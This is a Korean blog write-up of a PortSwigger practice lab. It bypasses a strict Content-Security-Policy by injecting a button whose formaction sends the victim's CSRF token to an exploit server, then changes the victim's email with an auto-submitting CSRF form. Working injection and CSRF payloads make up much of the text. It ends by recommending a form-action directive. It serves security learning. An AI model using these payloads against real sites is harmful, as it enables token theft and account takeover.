+++
date = '2026-06-08T13:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Reflected XSS protected by very strict CSP, with dangling markup attack'
summary = "외부 리소스를 제한하는 엄격한 CSP에서 누락된 form-action을 이용해 폼 제출 목적지를 바꾸고 CSRF 토큰을 획득하는 풀이"
toc = true
tags = ["XSS", "Reflected XSS", "CSP", "Form Hijacking", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

> ![image.png](/writeup/portswigger/xss/29/1.png)

애플리케이션에는 매우 엄격한 CSP가 적용되어 외부 서브리소스 요청과 인라인 스크립트 실행이 차단된다. 계정 페이지의 HTML Injection을 이용해 피해자의 CSRF 토큰을 획득하고 이메일을 `hacker@evil-user.net`으로 변경하면 문제가 해결된다. 실습 계정은 `wiener:peter`다.

### CSP와 주입 지점 확인

응답의 CSP는 다음과 같다.

```http
Content-Security-Policy: default-src 'self'; object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none'
```

스크립트와 이미지 등은 같은 출처로 제한되고 객체와 `<base>` 요소도 차단된다. 하지만 폼 제출 목적지를 제한하는 `form-action` 지시어는 없다.

`/my-account?email=xss`로 요청하면 `email` 파라미터가 다음 입력 요소에 반사된다.

```html
<input required type="email" name="email" value="xss">
```

큰따옴표와 꺾쇠가 인코딩되지 않으므로 input을 닫고 새로운 버튼을 삽입할 수 있다. 이 버튼은 뒤에 이어지는 CSRF hidden input과 같은 원래 폼에 포함된다.

---

## 익스플로잇

Exploit Server에서 피해자를 다음 URL로 이동시킨다.

```html
<script>
location = 'https://<lab-id>.web-security-academy.net/my-account?email=hacker@evil-user.net%22%3E%3Cbutton%20formaction=%22https://<exploit-id>.exploit-server.net/exploit%22%20formmethod=%22get%22%3EClick%3C/button%3E';
</script>
```

디코딩된 주입 문자열은 다음과 같다.

```html
hacker@evil-user.net"><button
  formaction="https://<exploit-id>.exploit-server.net/exploit"
  formmethod="get">Click</button>
```

`formaction`과 `formmethod`는 버튼을 눌렀을 때 원래 폼의 `action`과 `method`를 덮어쓴다. 시뮬레이션 사용자가 Click 버튼을 누르면 폼의 email과 CSRF hidden input이 GET 쿼리로 Exploit Server에 전송된다. 이는 CSP에 `form-action`이 없어 가능한 폼 하이재킹이다.

서버 접근 로그에서 토큰을 확인한다.

![image.png](/writeup/portswigger/xss/29/2.png)

획득한 토큰으로 이메일 변경 폼을 자동 제출하는 익스플로잇을 다시 전달한다.

```html
<form method="POST" action="https://<lab-id>.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="hacker@evil-user.net">
  <input type="hidden" name="csrf" value="<stolen-csrf-token>">
</form>
<script>document.forms[0].submit()</script>
```

피해자의 이메일이 변경되면서 문제가 해결된다.

![image.png](/writeup/portswigger/xss/29/3.png)

---

## 정리

엄격한 `default-src`도 폼 제출에는 자동으로 적용되지 않는다. 외부 전송을 막으려면 `form-action 'self'` 또는 필요한 목적지를 명시해야 한다. 이 랩은 스크립트 실행이 불가능한 HTML Injection도 폼의 동작을 바꾸어 민감 정보를 유출할 수 있음을 보여준다.
